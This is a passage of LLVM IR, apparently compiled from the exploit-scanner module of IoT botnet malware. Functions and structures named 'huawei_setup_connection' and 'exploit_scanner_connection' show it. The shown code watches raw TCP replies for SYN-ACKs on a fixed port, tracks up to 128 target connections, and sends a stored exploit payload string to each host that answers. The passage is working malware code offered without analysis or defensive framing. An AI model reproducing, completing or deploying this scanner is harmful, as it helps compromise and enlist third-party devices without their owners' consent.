  store %struct.sockaddr* null, %struct.sockaddr** %215, align 8
  %216 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %217 = load %struct.sockaddr*, %struct.sockaddr** %216, align 8
  %218 = call i64 @recvfrom(i32 noundef %213, i8* noundef %214, i64 noundef 1514, i32 noundef 16384, %struct.sockaddr* %217, i32* noundef null)
  %219 = trunc i64 %218 to i32
  store i32 %219, i32* %18, align 4
  %220 = load i32, i32* %18, align 4
  %221 = icmp sle i32 %220, 0
  br i1 %221, label %230, label %222

222:                                              ; preds = %206
  %223 = call i32* @__errno_location() #10
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 11
  br i1 %225, label %230, label %226

226:                                              ; preds = %222
  %227 = call i32* @__errno_location() #10
  %228 = load i32, i32* %227, align 4
  %229 = icmp eq i32 %228, 11
  br i1 %229, label %230, label %231

230:                                              ; preds = %226, %222, %206
  br label %351

231:                                              ; preds = %226
  %232 = load i32, i32* %18, align 4
  %233 = sext i32 %232 to i64
  %234 = icmp ult i64 %233, 40
  br i1 %234, label %235, label %236

235:                                              ; preds = %231
  br label %206

236:                                              ; preds = %231
  %237 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load i32, i32* @LOCAL_ADDR, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %243

242:                                              ; preds = %236
  br label %206

243:                                              ; preds = %236
  %244 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 6
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp ne i32 %247, 6
  br i1 %248, label %249, label %250

249:                                              ; preds = %243
  br label %206

250:                                              ; preds = %243
  %251 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 0
  %253 = load i16, i16* %252, align 4
  %254 = zext i16 %253 to i32
  %255 = call zeroext i16 @htons(i16 noundef zeroext -28321) #10
  %256 = zext i16 %255 to i32
  %257 = icmp ne i32 %254, %256
  br i1 %257, label %258, label %259

258:                                              ; preds = %250
  br label %206

259:                                              ; preds = %250
  %260 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %261 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %260, i32 0, i32 1
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = load i16, i16* %2, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp ne i32 %263, %265
  br i1 %266, label %267, label %268

267:                                              ; preds = %259
  br label %206

268:                                              ; preds = %259
  %269 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 9
  %273 = and i16 %272, 1
  %274 = icmp ne i16 %273, 0
  br i1 %274, label %276, label %275

275:                                              ; preds = %268
  br label %206

276:                                              ; preds = %268
  %277 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %278 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = lshr i16 %279, 12
  %281 = and i16 %280, 1
  %282 = icmp ne i16 %281, 0
  br i1 %282, label %284, label %283

283:                                              ; preds = %276
  br label %206

284:                                              ; preds = %276
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 10
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  br i1 %290, label %291, label %292

291:                                              ; preds = %284
  br label %206

292:                                              ; preds = %284
  %293 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = lshr i16 %295, 8
  %297 = and i16 %296, 1
  %298 = icmp ne i16 %297, 0
  br i1 %298, label %299, label %300

299:                                              ; preds = %292
  br label %206

300:                                              ; preds = %292
  %301 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %302 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 noundef %303) #10
  %305 = sub i32 %304, 1
  %306 = call i32 @htonl(i32 noundef %305) #10
  %307 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 8
  %309 = load i32, i32* %308, align 4
  %310 = icmp ne i32 %306, %309
  br i1 %310, label %311, label %312

311:                                              ; preds = %300
  br label %206

312:                                              ; preds = %300
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %313 = load i32, i32* %9, align 4
  store i32 %313, i32* %18, align 4
  br label %314

314:                                              ; preds = %332, %312
  %315 = load i32, i32* %18, align 4
  %316 = icmp slt i32 %315, 128
  br i1 %316, label %317, label %335

317:                                              ; preds = %314
  %318 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %318, i64 %320
  %322 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %321, i32 0, i32 2
  %323 = load i32, i32* %322, align 8
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %331

325:                                              ; preds = %317
  %326 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %326, i64 %328
  store %struct.exploit_scanner_connection* %329, %struct.exploit_scanner_connection** %22, align 8
  %330 = load i32, i32* %18, align 4
  store i32 %330, i32* %9, align 4
  br label %335

331:                                              ; preds = %317
  br label %332

332:                                              ; preds = %331
  %333 = load i32, i32* %18, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %18, align 4
  br label %314, !llvm.loop !37

335:                                              ; preds = %325, %314
  %336 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %337 = icmp eq %struct.exploit_scanner_connection* %336, null
  br i1 %337, label %338, label %339

338:                                              ; preds = %335
  br label %351

339:                                              ; preds = %335
  %340 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %341 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %340, i32 0, i32 8
  %342 = load i32, i32* %341, align 4
  %343 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 3
  store i32 %342, i32* %344, align 4
  %345 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %346 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %345, i32 0, i32 0
  %347 = load i16, i16* %346, align 4
  %348 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %349 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %348, i32 0, i32 4
  store i16 %347, i16* %349, align 8
  %350 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* noundef %350)
  br label %206

351:                                              ; preds = %338, %230
  br label %352

352:                                              ; preds = %351
  store %struct.fd_set* %5, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %353

353:                                              ; preds = %363, %352
  %354 = load i32, i32* %24, align 4
  %355 = zext i32 %354 to i64
  %356 = icmp ult i64 %355, 16
  br i1 %356, label %357, label %366

357:                                              ; preds = %353
  %358 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %359 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %358, i32 0, i32 0
  %360 = load i32, i32* %24, align 4
  %361 = zext i32 %360 to i64
  %362 = getelementptr inbounds [16 x i64], [16 x i64]* %359, i64 0, i64 %361
  store i64 0, i64* %362, align 8
  br label %363

363:                                              ; preds = %357
  %364 = load i32, i32* %24, align 4
  %365 = add i32 %364, 1
  store i32 %365, i32* %24, align 4
  br label %353, !llvm.loop !38

366:                                              ; preds = %353
  br label %367

367:                                              ; preds = %366
  br label %368

368:                                              ; preds = %367
  store %struct.fd_set* %6, %struct.fd_set** %27, align 8
  store i32 0, i32* %26, align 4
  br label %369

369:                                              ; preds = %379, %368
  %370 = load i32, i32* %26, align 4
  %371 = zext i32 %370 to i64
  %372 = icmp ult i64 %371, 16
  br i1 %372, label %373, label %382

373:                                              ; preds = %369
  %374 = load %struct.fd_set*, %struct.fd_set** %27, align 8
  %375 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %374, i32 0, i32 0
  %376 = load i32, i32* %26, align 4
  %377 = zext i32 %376 to i64
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %375, i64 0, i64 %377
  store i64 0, i64* %378, align 8
  br label %379

379:                                              ; preds = %373
  %380 = load i32, i32* %26, align 4
  %381 = add i32 %380, 1
  store i32 %381, i32* %26, align 4
  br label %369, !llvm.loop !39

382:                                              ; preds = %369
  br label %383

383:                                              ; preds = %382
  store i32 0, i32* %1, align 4
  br label %384

384:                                              ; preds = %490, %383
  %385 = load i32, i32* %1, align 4
  %386 = icmp slt i32 %385, 128
  br i1 %386, label %387, label %493

387:                                              ; preds = %384
  store i32 5, i32* %28, align 4
  %388 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %389 = load i32, i32* %1, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %388, i64 %390
  store %struct.exploit_scanner_connection* %391, %struct.exploit_scanner_connection** %7, align 8
  %392 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %393 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %392, i32 0, i32 2
  %394 = load i32, i32* %393, align 8
  %395 = icmp ne i32 %394, 0
  br i1 %395, label %396, label %416

396:                                              ; preds = %387
  %397 = load i32, i32* @huawei_fake_time, align 4
  %398 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %399 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %398, i32 0, i32 1
  %400 = load i32, i32* %399, align 4
  %401 = sub i32 %397, %400
  %402 = load i32, i32* %28, align 4
  %403 = icmp ugt i32 %401, %402
  br i1 %403, label %404, label %416

404:                                              ; preds = %396
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 8
  %408 = call i32 @close(i32 noundef %407)
  %409 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %410 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %409, i32 0, i32 0
  store i32 -1, i32* %410, align 8
  %411 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %412 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %411, i32 0, i32 2
  store i32 0, i32* %412, align 8
  %413 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %414 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %413, i32 0, i32 6
  %415 = getelementptr inbounds [256 x i8], [256 x i8]* %414, i64 0, i64 0
  call void @util_zero(i8* noundef %415, i32 noundef 256)
  br label %490

416:                                              ; preds = %396, %387
  %417 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %418 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %417, i32 0, i32 2
  %419 = load i32, i32* %418, align 8
  %420 = icmp eq i32 %419, 1
  br i1 %420, label %431, label %421

421:                                              ; preds = %416
  %422 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %423 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %422, i32 0, i32 2
  %424 = load i32, i32* %423, align 8
  %425 = icmp eq i32 %424, 3
  br i1 %425, label %431, label %426

426:                                              ; preds = %421
  %427 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %428 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %427, i32 0, i32 2
  %429 = load i32, i32* %428, align 8
  %430 = icmp eq i32 %429, 4
  br i1 %430, label %431, label %457

431:                                              ; preds = %426, %421, %416
  %432 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %433 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = srem i32 %434, 64
  %436 = zext i32 %435 to i64
  %437 = shl i64 1, %436
  %438 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %439 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %440 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %439, i32 0, i32 0
  %441 = load i32, i32* %440, align 8
  %442 = sdiv i32 %441, 64
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds [16 x i64], [16 x i64]* %438, i64 0, i64 %443
  %445 = load i64, i64* %444, align 8
  %446 = or i64 %445, %437
  store i64 %446, i64* %444, align 8
  %447 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %448 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 8
  %450 = load i32, i32* %12, align 4
  %451 = icmp sgt i32 %449, %450
  br i1 %451, label %452, label %456

452:                                              ; preds = %431
  %453 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %454 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %453, i32 0, i32 0
  %455 = load i32, i32* %454, align 8
  store i32 %455, i32* %12, align 4
  br label %456

456:                                              ; preds = %452, %431
  br label %489

457:                                              ; preds = %426
  %458 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %459 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %458, i32 0, i32 2
  %460 = load i32, i32* %459, align 8
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %488

462:                                              ; preds = %457
  %463 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %464 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %463, i32 0, i32 0
  %465 = load i32, i32* %464, align 8
  %466 = srem i32 %465, 64
  %467 = zext i32 %466 to i64
  %468 = shl i64 1, %467
  %469 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %470 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %471 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %470, i32 0, i32 0
  %472 = load i32, i32* %471, align 8
  %473 = sdiv i32 %472, 64
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds [16 x i64], [16 x i64]* %469, i64 0, i64 %474
  %476 = load i64, i64* %475, align 8
  %477 = or i64 %476, %468
  store i64 %477, i64* %475, align 8
  %478 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %479 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %478, i32 0, i32 0
  %480 = load i32, i32* %479, align 8
  %481 = load i32, i32* %11, align 4
  %482 = icmp sgt i32 %480, %481
  br i1 %482, label %483, label %487

483:                                              ; preds = %462
  %484 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %485 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %484, i32 0, i32 0
  %486 = load i32, i32* %485, align 8
  store i32 %486, i32* %11, align 4
  br label %487

487:                                              ; preds = %483, %462
  br label %488

488:                                              ; preds = %487, %457
  br label %489

489:                                              ; preds = %488, %456
  br label %490

490:                                              ; preds = %489, %404
  %491 = load i32, i32* %1, align 4
  %492 = add nsw i32 %491, 1
  store i32 %492, i32* %1, align 4
  br label %384, !llvm.loop !40

493:                                              ; preds = %384
  %494 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %494, align 8
  %495 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %495, align 8
  %496 = load i32, i32* %12, align 4
  %497 = load i32, i32* %11, align 4
  %498 = icmp sgt i32 %496, %497
  br i1 %498, label %499, label %501

499:                                              ; preds = %493
  %500 = load i32, i32* %12, align 4
  br label %503

501:                                              ; preds = %493
  %502 = load i32, i32* %11, align 4
  br label %503

503:                                              ; preds = %501, %499
  %504 = phi i32 [ %500, %499 ], [ %502, %501 ]
  %505 = add nsw i32 1, %504
  %506 = call i32 @select(i32 noundef %505, %struct.fd_set* noundef %5, %struct.fd_set* noundef %6, %struct.fd_set* noundef null, %struct.timeval* noundef %8)
  store i32 %506, i32* %13, align 4
  %507 = call i64 @time(i64* noundef null) #11
  %508 = trunc i64 %507 to i32
  store i32 %508, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %509

509:                                              ; preds = %727, %503
  %510 = load i32, i32* %1, align 4
  %511 = icmp slt i32 %510, 128
  br i1 %511, label %512, label %730

512:                                              ; preds = %509
  %513 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %514 = load i32, i32* %1, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %513, i64 %515
  store %struct.exploit_scanner_connection* %516, %struct.exploit_scanner_connection** %7, align 8
  %517 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %518 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %517, i32 0, i32 0
  %519 = load i32, i32* %518, align 8
  %520 = icmp eq i32 %519, -1
  br i1 %520, label %521, label %522

521:                                              ; preds = %512
  br label %727

522:                                              ; preds = %512
  %523 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %524 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %525 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 8
  %527 = sdiv i32 %526, 64
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds [16 x i64], [16 x i64]* %523, i64 0, i64 %528
  %530 = load i64, i64* %529, align 8
  %531 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %532 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %531, i32 0, i32 0
  %533 = load i32, i32* %532, align 8
  %534 = srem i32 %533, 64
  %535 = zext i32 %534 to i64
  %536 = shl i64 1, %535
  %537 = and i64 %530, %536
  %538 = icmp ne i64 %537, 0
  br i1 %538, label %539, label %609

539:                                              ; preds = %522
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %540 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %541 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %540, i32 0, i32 0
  %542 = load i32, i32* %541, align 8
  %543 = bitcast i32* %29 to i8*
  %544 = call i32 @getsockopt(i32 noundef %542, i32 noundef 1, i32 noundef 4, i8* noundef %543, i32* noundef %31) #11
  store i32 %544, i32* %30, align 4
  %545 = load i32, i32* %29, align 4
  %546 = icmp eq i32 %545, 0
  br i1 %546, label %547, label %599

547:                                              ; preds = %539
  %548 = load i32, i32* %30, align 4
  %549 = icmp eq i32 %548, 0
  br i1 %549, label %550, label %599

550:                                              ; preds = %547
  %551 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %552 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %551, i32 0, i32 2
  %553 = load i32, i32* %552, align 8
  %554 = icmp eq i32 %553, 3
  br i1 %554, label %555, label %580

555:                                              ; preds = %550
  %556 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %557 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %556, i32 0, i32 8
  %558 = getelementptr inbounds [2560 x i8], [2560 x i8]* %557, i64 0, i64 0
  %559 = call i32 @util_strcpy(i8* noundef %558, i8* noundef getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i64 0, i64 0))
  %560 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %561 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %564 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %563, i32 0, i32 8
  %565 = getelementptr inbounds [2560 x i8], [2560 x i8]* %564, i64 0, i64 0
  %566 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %567 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %566, i32 0, i32 8
  %568 = getelementptr inbounds [2560 x i8], [2560 x i8]* %567, i64 0, i64 0
  %569 = call i32 @util_strlen(i8* noundef %568)
  %570 = sext i32 %569 to i64
  %571 = call i64 @send(i32 noundef %562, i8* noundef %565, i64 noundef %570, i32 noundef 16384)
  %572 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %573 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %572, i32 0, i32 8
  %574 = getelementptr inbounds [2560 x i8], [2560 x i8]* %573, i64 0, i64 0
  call void @util_zero(i8* noundef %574, i32 noundef 2560)
  %575 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %576 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %575, i32 0, i32 6
  %577 = getelementptr inbounds [256 x i8], [256 x i8]* %576, i64 0, i64 0
  call void @util_zero(i8* noundef %577, i32 noundef 256)
  %578 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %579 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %578, i32 0, i32 2
  store i32 4, i32* %579, align 8
  br label %727

580:                                              ; preds = %550
  %581 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %582 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %581, i32 0, i32 2
  %583 = load i32, i32* %582, align 8
  %584 = icmp eq i32 %583, 4
  br i1 %584, label %585, label %594

585:                                              ; preds = %580
  %586 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %587 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %586, i32 0, i32 0
  %588 = load i32, i32* %587, align 8
  %589 = call i32 @close(i32 noundef %588)
  %590 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %590, i32 0, i32 0
  store i32 -1, i32* %591, align 8
  %592 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %593 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %592, i32 0, i32 2
  store i32 0, i32* %593, align 8
  br label %727

594:                                              ; preds = %580
  %595 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %596 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %595, i32 0, i32 2
  store i32 3, i32* %596, align 8
  br label %597

597:                                              ; preds = %594
  br label %598

598:                                              ; preds = %597
  br label %608

599:                                              ; preds = %547, %539
  %600 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %600, i32 0, i32 0
  %602 = load i32, i32* %601, align 8
  %603 = call i32 @close(i32 noundef %602)
  %604 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %605 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %604, i32 0, i32 0
  store i32 -1, i32* %605, align 8
  %606 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %607 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %606, i32 0, i32 2
  store i32 0, i32* %607, align 8
  br label %727

608:                                              ; preds = %598
  br label %609

609:                                              ; preds = %608, %522
  %610 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %611 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %611, i32 0, i32 0
  %613 = load i32, i32* %612, align 8
  %614 = sdiv i32 %613, 64
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds [16 x i64], [16 x i64]* %610, i64 0, i64 %615
  %617 = load i64, i64* %616, align 8
  %618 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %618, i32 0, i32 0
  %620 = load i32, i32* %619, align 8
  %621 = srem i32 %620, 64
  %622 = zext i32 %621 to i64
  %623 = shl i64 1, %622
  %624 = and i64 %617, %623
  %625 = icmp ne i64 %624, 0
  br i1 %625, label %626, label %726

626:                                              ; preds = %609
  br label %627

627:                                              ; preds = %707, %688, %626
  store i32 0, i32* %32, align 4
  %628 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %628, i32 0, i32 2
  %630 = load i32, i32* %629, align 8
  %631 = icmp eq i32 %630, 0
  br i1 %631, label %632, label %633

632:                                              ; preds = %627
  br label %725

633:                                              ; preds = %627
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 5
  %636 = load i32, i32* %635, align 4
  %637 = icmp eq i32 %636, 256
  br i1 %637, label %638, label %650

638:                                              ; preds = %633
  %639 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %639, i32 0, i32 6
  %641 = getelementptr inbounds [256 x i8], [256 x i8]* %640, i64 0, i64 0
  %642 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %643 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %642, i32 0, i32 6
  %644 = getelementptr inbounds [256 x i8], [256 x i8]* %643, i64 0, i64 0
  %645 = getelementptr inbounds i8, i8* %644, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %641, i8* align 1 %645, i64 192, i1 false)
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 5
  %648 = load i32, i32* %647, align 4
  %649 = sub nsw i32 %648, 64
  store i32 %649, i32* %647, align 4
  br label %650

650:                                              ; preds = %638, %633
  %651 = call i32* @__errno_location() #10
  store i32 0, i32* %651, align 4
  %652 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %656 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %655, i32 0, i32 6
  %657 = getelementptr inbounds [256 x i8], [256 x i8]* %656, i64 0, i64 0
  %658 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %659 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %658, i32 0, i32 5
  %660 = load i32, i32* %659, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds i8, i8* %657, i64 %661
  %663 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
